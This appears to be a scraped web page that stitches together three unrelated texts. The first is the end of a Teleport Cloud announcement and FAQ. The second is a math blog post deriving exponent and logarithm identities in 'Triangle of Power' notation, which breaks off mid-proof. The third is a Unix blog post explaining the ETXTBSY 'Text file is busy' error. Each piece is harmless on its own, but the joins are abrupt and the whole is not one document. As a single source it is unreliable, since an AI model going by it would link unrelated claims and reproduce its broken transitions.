<p>Teleport Cloud is running on AWS. The audit logs are encrypted at rest and stored in DynamoDB and Amazon S3. We have also taken some measures to isolate Teleport Cloud tenants, so every Teleport Cloud instance is an isolated single tenant and is running as a standalone process with SELinux profile and a separate kIAM role using the industry <a href="https://github.com/gravitational/workshop/blob/master/k8ssecurity.md">best security practices</a>.</p>

<h2 id="faq">FAQ</h2>

<p><strong>Q: Can the Teleport Team decrypt and see my SSH traffic?</strong>
<strong>A:</strong> No. We cannot see your SSH traffic, because encryption happens end-to-end, i.e. from your client machines to your servers.</p>

<p><strong>Q: Early Access? Is this production-ready?</strong>
<strong>A:</strong> Teleport itself has been in production at organizations like Samsung, Snowflake, and IBM, and Teleport Cloud is the same product, just hosted by us. We are hand-selecting early Cloud users because Teleport Cloud isn’t yet available in every geographic region and also because we want more UX feedback before we make it generally available.</p>

<p><strong>Q: Can I use Teleport Cloud Preview in production?</strong>
<strong>A:</strong> We expect Teleport Cloud to be suitable to use in non mission critical systems that do not require <sup>24</sup>⁄<sub>7</sub> access or a guaranteed SLA. We recommend a fallback option be available in the event of error or outage.</p>

<p><strong>Q: Are you using AWS-managed encryption keys, or CMKs via KMS?</strong>
<strong>A:</strong> We use AWS-managed keys. Currently there is no option to provide your own key.</p>

<h2 id="starting-with-teleport-cloud">Starting with Teleport Cloud</h2>

<p>If you’re interested in trying a fully hosted Teleport, or simply want to hear more, please <a href="https://goteleport.com/teleport/cloud/">reserve your spot</a> on the waiting list!</p>

<p>Initially, we are focusing on the most common US-based hosting regions, but we need more input from you on where to go next. Teleport will not be worthy of its name until you can instantly “teleport” your software <a href="https://goteleport.com/resources/white-papers/environment-free-computing/">anywhere you want</a>!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>The web is full of amazing and surprising creations. One such creation that has caught my attention lately was a video by 3Blue1Brown on the so-called “Triangle of Power”.</p>
<p><iframe width="720" height="405" src="https://www.youtube.com/embed/sULa9Lc4pck" frameborder="0" allowfullscreen=""></iframe></p>
<p>Apparently, the ideas originated on <a href="http://math.stackexchange.com/questions/30046/alternative-notation-for-exponents-logs-and-roots" target="_blank">a Math Stack Exchange thread</a> asking for more unified notations for exponents, logarithms and radicals. Indeed, while these formulas $2^3 = 8$, $\sqrt[3]{8} = 2$ and $\log_2 8 = 3$ are all discussing the same relationship that holds between 2, 3 and 8, they look so different that a student may not witness their commonality.</p>
<p>I see. So, the question is whether there could be a more explicit notations to unify and better visualize this relationship…</p>
<p>Yes indeed. One alternative notation has gained much interest. It is the so-called <strong>Triangle of Power</strong>. In our case, this triangle of power can depict the relationship between 2, 3 and 8 in a wonderfully compact and harmonious way, namely by denoting $_2\overset{3}{\Delta}_8$.</p>
<p>And that triangle $_2\overset{3}{\Delta}_8$ is a formula?</p>
<p>No! It’s more like an identity in itself. To perform computations, it might be useful to move one of the entries of the triangle to the other side of an equal sign as follows:<br>
$$_2\overset{3}{\Delta}_8 \Longleftrightarrow \; _2\overset{3}{\Delta} = 8\Longleftrightarrow \overset{3}{\Delta}_8 = 2\Longleftrightarrow \; _2\Delta_8 = 3.$$</p>
<p>3Blue1Brown argues that this beautiful notation greatly simplifies the understanding of the mathematical underlying objects, namely exponents, logarithms and radicals. This claim is quite disturbing at first. Indeed, again and again, I had to translate the equations of his video into equations in terms of the notations I am more familiar with. I could not think in terms of the triangle of power.</p>
<p>So you think it’s a bad notation…</p>
<p>Actually, no. This just helped realize how dependent on current flawed notations my mathematical thinking was! That’s not good! Moreover, I did get stunned by some of the many artful equations that this new notation yielded, e.g.<br>
$$_x\overset{y}{\Delta}_{_x\overset{y}{\Delta}}, \; _x\overset{_x\Delta_z}{\Delta}_z, \; _{\overset{y}{\Delta}_z}\overset{y}{\Delta}_z, \; \overset{+}{\Delta}_\times, \;  _\times\Delta_\times, \; _\times\overset{\oplus}{\Delta}, \; _x\overset{y}{\Delta} = \overset{1/y}{\Delta}_x, \; _{_x\overset{y}{\Delta}}\overset{z}{\Delta}_{_x\overset{yz}{\Delta}}, \; _x\Delta_y \; _y\Delta_z = \; _x\Delta_z, \; _e\overset{i\tau}{\Delta}_1, \; _e\overset{i\tau/4}{\Delta}_i \ldots $$</p>
<p>By the end of the video, I got hooked.</p>
<p>Even though you couldn’t follow the computations…</p>
<p>That’s true. And it would have been hypocritical of me to claim that they were indeed the way to go, if I had not yet experienced the actual benefaction of using and thinking in terms of this triangle of power. Following 3Blue1Brown’s advice, it seemed that the only way for me to do so is to go explore and play with the triangle of power. So I gave myself homeworks.</p>
<p>What homework?</p>
<p>I’ve decided to redefine and rederive well-known results about exponents, logarithms and radicals. And since I love the web, I couldn’t not share it with you.  Enjoy!</p>
<h2>Defining the Triangle of Power</h2>
<p>Let us start from the bottom. We’ll assume that integers and real numbers have been well-defined, as well as the addition and the multiplication. In this section, we’ll redefine the triangle of power $_x\overset{y}{\Delta}_z$ for all $x,z &gt; 0$ and $y \in \mathbb R$. It won’t be straightforward though. The first step is to define the triangle of power for top integer values of $y$, then for top rational values, and finally we shall use continuity to generalize it for real tops.</p>
<p>OK… Let’s start with integer tops.</p>
<p>Let’s define $_x\overset{n}{\Delta}$ for all $x &gt; 0$ <a href="http://www.science4all.org/article/proof-by-induction/" target="_blank">by induction</a> on $n$. For $n=0$, we define $_x\overset{0}{\Delta}_1$, and we consider the induction $_x\overset{n\pm 1}{\Delta}_{x^{\pm 1} \times \overset{n}{_x\Delta}}$. We indeed use the “+” sign to define induction over positive integers, and the “-” sign for induction over negative integers.</p>
<p>Wait… Are you sure you’ve given an actual inductive definition?</p>
<p>Getting used to the meaning of the compact triangle-of-power notation is likely to be troublesome at first. What we really mean in terms of equations is that we define respectively $_x\overset{0}{\Delta} = 1$ and $_x\overset{n\pm1}{\Delta} = x^{\pm1} \times\; _x\overset{n}{\Delta}$. More generally, we have<br>
$$_x\overset{n}{\Delta}_y \Longleftrightarrow \; _x\overset{n}{\Delta} = y\Longleftrightarrow \overset{n}{\Delta}_y = x\Longleftrightarrow \; _x\Delta_y = n.$$ From this definition, it follows straightforwardly that $_1\overset{n}{\Delta}_1$, $\;_x\overset{m+n}{\Delta} = \;_x\overset{m}{\Delta} \times\, _x\overset{n}{\Delta}$, $\; _x\overset{-n}{\Delta} = \;_{1/x}\overset{n}{\Delta} = \;\left( _x\overset{n}{\Delta} \right)^{-1}$ and that $x \mapsto \;_x\overset{n}{\Delta}$ is strictly increasing for $n \geq 1$ (and thus injective).</p>
<p>I think I follow…</p>
<p>Take your time. These notations can be very troubling.</p>
<p>Sure. You can move on.</p>
<p>Let us now a prove our first beautiful theorem. For $x&gt;0$ and $n,m\in \mathbb Z$, we have $_{_x\overset{m}{\Delta}}\overset{n}{\Delta}_{_x\overset{mn}{\Delta}}$. I cannot help to comment on how cool I think that this elegantly structured notation is a theorem! We prove this by induction on $n$. The case $n=0$ boils down to the definition of the triangle of power for zero top value. Assuming that the result holds for $n$, we now have, using the induction definition of the triangle of power, $_{_x\overset{m}{\Delta}}\overset{n+1}{\Delta} = \;_x\overset{m}{\Delta} \; \times\, _{_x\overset{m}{\Delta}}\overset{n}{\Delta} = \;_x\overset{m}{\Delta} \times\, _x\overset{mn}{\Delta} = \;_x\overset{m(n+1)}{\Delta}$. This equality can be equivalently rewritten as $_{_x\overset{m}{\Delta}}\overset{n+1}{\Delta}_{_x\overset{m(n+1)}{\Delta}}$, which concludes the induction proof.</p>
<p>There is elegance in the notation indeed…</p>
<p>I know! Here’s another beautiful theorem. For all $x,y &gt; 0$ and $m,n \in \mathbb Z$, we have $_x\overset{n}{\Delta}_{y} \Longleftrightarrow \; _x\overset{mn}{\Delta}_{_y\overset{m}{\Delta}}$. Using the previous result, we see that the right-hand side is equivalent to $_{_x\overset{n}{\Delta}}\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$. For the left-to-right implication we can replace the left of the main triangle by $y$, yielding $_y\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$, which is equivalent to $_y\overset{m}{\Delta} = \; _y\overset{m}{\Delta}$, which is clearly true. To go from right to left, we notice that $z = y$ is a solution of $_z\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$. Yet the map $z \mapsto \; _z\overset{m}{\Delta}$ is injective, thus it is the only solution. Thus $_x\overset{n}{\Delta} = y$, which concludes the proof for positive integers $n$. </p>
<p>Cool! And I guess that the case for negative integers $n$ is dealt with similarly.</p>
<p>Yes! The theorem we’ve just proved can now be used to define the triangle power for rational tops. For $p \in \mathbb Z$ and $q \in \mathbb Z^*$, we define $_x\overset{p/q}{\Delta}_{y}$ if $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}}$. To prove the consistency of this definition, we need to make sure that it holds for any $p’,q’$ instead of $p,q$, whenever $p’/q’ = p/q$. To prove this it suffices to show that $_x\overset{p/q}{\Delta}_{y} \Longleftrightarrow _x\overset{kp/kq}{\Delta}_y$, i.e. $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow \; _x\overset{kp}{\Delta}_{_y\overset{kq}{\Delta}}$. But this boils down to applying the two previous theorems. Indeed, $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow\; _x\overset{kp}{\Delta}_{_{_y\overset{q}{\Delta}}\overset{k}{\Delta}} \Longleftrightarrow \;_x\overset{kp}{\Delta}_{_y\overset{kq}{\Delta}}$.</p>
<p>Cool! Top integers, checked. Top rationals, checked. All we have left to define are top reals!</p>
<p>Yes. But to get there, we’ll need to first prove another beautiful theorem: $_x\overset{p/q}{\Delta}_y \Longleftrightarrow \; _x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow \; _x\overset{p}{\Delta} = \; _y\overset{q}{\Delta} \Longleftrightarrow \; _y\overset{q}{\Delta}_{_x\overset{p}{\Delta}} \Longleftrightarrow \; _y\overset{q/p}{\Delta}_x$. In other words, by fixing $r = p/q$, we obtain the reflection theorem. For $x,y &gt; 0$ and $r \in \mathbb Q^*$, we have $_x\overset{r}{\Delta}_y \Longleftrightarrow \; _y\overset{1/r}{\Delta}_x$. This is so pretty! Moreover, by continuity, in the next section, we’ll see that this holds for nonzero real tops as well.</p>
<p>Are we now ready to define the triangle of power for top reals?</p>
<p>Almost! We now need to prove that for any $x\geq 1$, we have $_x\overset{1/n}{\Delta} \rightarrow 1$. Notice to start with that $_x\overset{1/n}{\Delta} \geq 1$. Now we consider $\epsilon &gt; 0$. Then it is easy to see that $_{1+\epsilon}\overset{n}{\Delta} \rightarrow \infty$. In particular, there exists $N$ large enough so that $_{1+\epsilon}\overset{N}{\Delta} \geq x$. Moreover, for $n \geq N$, we have $_{1+\epsilon}\overset{n}{\Delta} \geq x$. By montonicity of the triangle power, this means that $1+\epsilon \geq \overset{n}{\Delta}_x = \;_x\overset{1/n}{\Delta} \geq 1$. This corresponds exactly to saying that $_x\overset{1/n}{\Delta} \rightarrow 1$. Using $_{1/x}\overset{1/n}{\Delta} = \left(\; _x\overset{1/n}{\Delta} \right)^{-1}$ and monotonocity, we can generalize this result for all $x&gt;0$ and rational top. Namely, for any $x&gt;0$ and $\epsilon &gt;0$, there exists some $\delta&gt;0$ such that for any rational $r \in (1-\delta,1+\delta) \cap \mathbb Q$, we have $\left|\;_x\overset{r}{\Delta} – 1\right| \leq \epsilon$.</p>
<p>In other words, the right side of the triangle of power is sort of continuous with respect to rational tops.</p>
<p>This is almost what we’ve proved, and exactly where I’m going with that! Let’s show that if a rational sequence $r_n$ converges, then, for all $x &gt; 0$, the sequence $_x\overset{r_n}{\Delta}$ converges too. We have $ \left| \; …</p></div></div>

	<p><small>April  6, 2016</small></p>
</div><div><p>Perhaps you have seen this somewhat odd Unix error before:</p>


<blockquote><pre># cp prog /usr/local/bin/prog
cp: cannot create regular file 'prog': Text file is busy
</pre>
</blockquote>

<p>This is not just an unusual error message, it's also a rare instance
of Unix being friendly and not letting you blow your foot off with
a perfectly valid operation that just happens to be (highly) unwise.
To understand it, let's first work out what exact operation is
failing. I'll do this with <code>strace</code> on Linux, mostly because it's
what I have handy:</p>

<pre>$ cp /usr/bin/sleep /tmp/
$ /tmp/sleep 120 &amp;
$ strace cp /usr/bin/sleep /tmp/
[...]
open("/usr/bin/sleep", O_RDONLY)        = 3
fstat(3, {st_mode=S_IFREG|0755, st_size=32600, ...}) = 0
open("/tmp/sleep", O_WRONLY|O_TRUNC)    = -1 ETXTBSY (Text file busy)
[...]
</pre>

<p>There we go. <code>cp</code> is failing when it attempts to open <code>/tmp/sleep</code>
for writing and truncate it, which we have a running program, and
the specific Unix errno value here is <code>ETXTBSY</code>. If you experiment
some more you'll discover that we're allowed to remove <code>/tmp/sleep</code>
if we want to, just not write to it or truncate it (at least on
Linux; the specifics of what's disallowed may vary slightly on other
Unixes). This is an odd limitation for Unix, because normally there's
nothing that prevents one process from modifying a file out from
underneath another process (even in harmful ways). Unix leaves it
up to the program(s) involved to coordinate things between themselves,
rather than enforcing a policy of 'no writing if there are readers'
or something in the kernel.</p>

<p>But running processes are special, because really bad things usually
happen if you modify the on-disk code of a running process. The
problem is virtual memory, or more exactly paged virtual memory.
On a system with paged virtual memory, programs aren't loaded into
RAM all at once and then kept there; instead they're paged into RAM
in bits and pieces as bits of code (and data) are needed.  In fact,
some times already-loaded bits and pieces are dropped from RAM in
order to free up space, since they can always be loaded back in from
disk.</p>

<p>Well, they can be loaded back in from disk if some joker hasn't
gone and changed them on disk, at least. All of this paging programs
into RAM in sections only works if the program's file on disk doesn't
ever change while the program is running. If the kernel allowed
running programs to change on disk, it could wind up loading in one
page of code from version 1 of the program and another page from
version 2. If you're lucky, the result would segfault. If you're
unlucky, you might get silent malfunctions, data corruption, or
other problems. So for once the Unix kernel does not let you blow
your foot off if you really want to; instead it refuses to let you
write to a program on disk if the program is running. You can
truncate or overwrite any other sort of file even if programs are
using it, just not things that are part of running programs. Those
are special.</p>

<p>Given the story I've just told, you might expect <code>ETXTBSY</code> to
have appeared in Unix in or around 3BSD, which is more or less the
first version of Unix with paged virtual memory. However, this is
not the case. <code>ETXTBSY</code> turns out to be much older than BSD Unix,
going back to at least Research V5. Research Unix through V7 didn't
have paged virtual memory (it only swapped entire programs in and
out), but apparently the Research people decided to simplify their
lives by basically locking the files for executing programs against
modification.</p>

<p>(In fact Research Unix was stricter than modern Unixes, as it looks
like you couldn't delete a program's file on disk if it was running.
That section of the kernel code for <code>unlink()</code> gets specifically
commented out no later than 3BSD, <a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=3BSD/usr/src/sys/sys/sys4.c">cf</a>.)</p>

<p>PS: the 'text' in 'text file' here actually means 'executable code',
per say <code>size</code>'s output. Of course it's not just the actual executable
code that could be dangerous if it changed out from underneath a
running program, but there you go.</p>

<h3>Sidebar: the way around this if you're updating running programs</h3>

<p>To get around this, all you have to do is remove the old file before
writing the new file into place. This (normally) doesn't cause any
problems; the kernel treats the 'removed but still being used by a
running program' executable the same way it treats any 'removed but
still open' file. <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/UnixPendingDeleteProblem">As usual</a> the file
is only actually removed when the last reference goes away, in this
case the last process using the old executable exits.</p>

<p>(Of course <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/NFSPendingDeletes">NFS throws a small monkey wrench into things</a>, sometimes in <a href="https://utcc.utoronto.ca/~cks/space/blog/sysadmin/SafelyUpdatingNFSFilesII">more than one way</a>.)</p>
